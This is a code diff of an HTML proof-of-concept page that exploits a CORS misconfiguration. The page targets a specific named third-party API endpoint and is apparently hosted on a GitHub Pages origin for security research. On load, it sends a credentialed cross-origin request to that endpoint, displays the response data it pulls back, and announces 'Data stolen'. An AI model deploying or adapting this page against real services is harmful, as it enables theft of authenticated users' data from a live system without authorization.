@@ -1,40 +1,71 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>CORS PoC - Livel10 Research</title>
+    <meta charset="UTF-8">
+    <title>PoC: SendGrid CORS Vulnerability</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #1c1e21; padding: 40px; text-align: center; }
+        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 700px; margin: auto; border-top: 5px solid #ff4757; }
+        h2 { color: #ff4757; }
+        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; }
+        .status { font-weight: bold; margin: 15px 0; padding: 10px; border-radius: 5px; }
+        .success { background: #e3f9e5; color: #1f8b24; }
+        .error { background: #ffe3e3; color: #bf2121; }
+    </style>
 </head>
 <body>
-    <h1>CORS Misconfiguration Exploit</h1>
-    <p>Target: https://b1.api.kons.antrag.vwfs.de/report</p>
-    <div id="result">Waiting for response...</div>
 
-    <script>
-        fetch('https://b1.api.kons.antrag.vwfs.de/report', {
-            method: 'GET',
-            mode: 'cors',
+<div class="box">
+    <h2>Exploit Proof-of-Concept</h2>
+    <p>Target: <code>b1.api.kons.antrag.vwfs.de/report</code></p>
+    <p>Source Origin: <code>https://stelemane.github.io</code></p>
+    
+    <div id="status" class="status">[*] Initializing Request...</div>
+    <pre id="output">Waiting for data...</pre>
+</div>
+
+<script>
+    window.onload = function() {
+        const statusDiv = document.getElementById('status');
+        const outputDiv = document.getElementById('output');
+        
+        const target = "https://b1.api.kons.antrag.vwfs.de/report";
+
+        statusDiv.innerText = "[*] Sending request with Authorization & Credentials...";
+
+        fetch(target, {
+            method: "GET",
+            mode: "cors",
+            credentials: "include",
             headers: {
-                'Origin': 'https://stelemane.github.io/poc/' 
-            },
-            credentials: 'include'
+                "Accept": "application/json",            }
         })
         .then(response => {
-            const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
-            const allowCreds = response.headers.get('Access-Control-Allow-Credentials');
-            
-            document.getElementById('result').innerHTML = `
-                <p><b>Access-Control-Allow-Origin:</b> ${allowOrigin}</p>
-                <p><b>Access-Control-Allow-Credentials:</b> ${allowCreds}</p>
-                <p><b>Status:</b> ${response.status}</p>
-            `;
-            return response.text();
+            if (response.ok) {
+                statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
+                statusDiv.className = "status success";
+                return response.json();
+            } else {
+                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
+                statusDiv.className = "status error";
+                return response.text();
+            }
         })
         .then(data => {
-            console.log("Stolen Data:", data);
+            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+            
+            if (typeof data === 'object') {
+                alert("Vulnerability Confirmed!\nData stolen from report.kons.antrag.vwfs.de");
+            }
         })
         .catch(err => {
-            console.error("Failed to fetch:", err);
-            document.getElementById('result').innerText = "Request blocked or failed.";
+            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.className = "status error";
+            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
+            console.error(err);
         });
-    </script>
+    };
+</script>
+
 </body>
 </html>
